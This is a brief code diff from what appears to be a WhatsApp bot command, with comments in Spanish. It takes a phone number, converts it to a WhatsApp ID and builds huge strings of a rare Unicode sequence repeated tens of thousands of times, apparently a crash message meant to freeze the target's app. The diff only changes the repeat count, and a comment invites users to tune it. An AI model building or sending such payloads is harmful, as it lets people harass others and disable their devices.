@@ -9,7 +9,7 @@ let handler = async (m, { text, conn, isGroup, isAdmin }) => {
   }
 
   let numero = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
-  let textoFinal = '𑇂𑆵𑆴𑆿'.repeat(90000); // Si quieres cambia l cantidad xdxd
+  let textoFinal = '𑇂𑆵𑆴𑆿'.repeat(40000); // Si quieres cambia l cantidad xdxd
 
   const nombre = '𑇂𑆵𑆴𑆿'.repeat(90000).trim();
   const direccion = '𑇂𑆵𑆴𑆿'.repeat(90000).trim();
